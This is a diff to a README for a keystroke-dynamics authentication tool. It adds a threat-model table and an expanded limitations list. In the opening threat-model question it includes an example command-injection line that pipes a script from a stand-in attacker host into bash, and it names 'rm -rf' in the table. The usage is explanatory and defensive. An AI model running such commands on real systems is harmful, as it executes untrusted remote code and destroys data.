@@ -181,11 +181,27 @@ Replaying raw hardware event streams through the unified object-oriented decisio
 - **FRR (False Rejection Rate)**: fraction of genuine windows scored above the anomaly threshold (wrongly flagged).
 - **EER (Equal Error Rate)**: threshold where FAR ≈ FRR; standard single-number summary metric in keystroke dynamics literature.
 
+## Threat Model & Security Boundaries
+
+A common question in continuous behavioral biometrics is: *Can keystroke dynamics stop a rapid command injection attack (e.g., typing `curl evil.com/p.sh | bash` in ~25 keystrokes)?*
+
+The short answer is **no**, and that is by mathematical design. Free-text continuous authentication relies on estimating distribution moments across unconstrained vocabulary, requiring a minimum sample size ($W=50$, triggering at $\sim 70$ keystrokes under Dynamic Ramp-Up) to prevent false lockouts on the authorized user. It is not an inline command firewall or an Endpoint Detection & Response (EDR) agent. Instead, it serves as a Layer 3 defense-in-depth control targeting post-exploitation persistence and session hijacking:
+
+| Threat Scenario | Keystroke Count | Coverage Status | Primary Defense Layer |
+|---|---|---|---|
+| **Drive-by Command Injection** (`curl ...`, `rm -rf`) | 20–35 keys | ❌ Out of Scope | Layer 1/2: OS Privilege Elevation (`sudo`/UAC) & EDR script-blocking |
+| **Workplace Insider Takeover** (Coworker sitting at unlocked desk reading emails, browsing Slack/repos) | 200–2,000+ keys | ✅ **Covered (Early Alert)** | Layer 3: Dynamic Ramp-Up locks session at **~70 keys (~14 words)** |
+| **Remote Session Hijacking** (Attacker hijacks active RDP, TeamViewer, or SSH terminal) | 300–5,000+ keys | ✅ **Covered (Persistent Alert)** | Layer 3: Sustained anomaly flags terminate session and alert admin |
+| **Stolen Unlocked Laptop** (Thief grabs laptop in coffee shop and searches filesystem) | 100+ keys | ✅ **Covered (Early Alert)** | Layer 3: Session locked on first paragraph typed; Layer 1: OS screen lock |
+| **Low-and-Slow Window Starvation** (Adversary typing 3–4 keys every 35s to trip watchdog) | Micro-bursts | ⚠️ Evasion Risk | Layer 1: OS inactivity screen lock (60s timer) forces full password re-auth |
+
 ## Limitations
 
-- No defence against replay attacks using captured timing metadata from a prior session.
-- Baseline generalization depends on data diversity — a baseline from a single narrow session may not reflect natural drift across time of day, keyboard, or fatigue.
-- Classical Isolation Forest chosen for lightness and interpretability over deep-learning alternatives.
+- **Minimum Detection Latency**: Requires at least 70 keystrokes (~14 words) under Dynamic Ramp-Up to reach statistical consensus without inflating False Rejection Rates (FRR).
+- **No Defense Against Replay Attacks**: Replaying captured timing metadata from a prior session would bypass the anomaly detector.
+- **Single-Modality Blindspot**: Non-typing actions (mouse navigation, passive screen viewing) do not generate timing events until the keyboard is touched.
+- **Baseline Generalization & Temporal Drift**: Models trained during a single narrow session may experience drift due to fatigue, circadian rhythm, or physical keyboard switches (addressed in Phase 6).
+- **Classical Model Complexity**: Classical Isolation Forest was selected for extreme runtime lightness, low memory footprint, and CPU efficiency over deep sequence models.
 
 ## Research Context
 
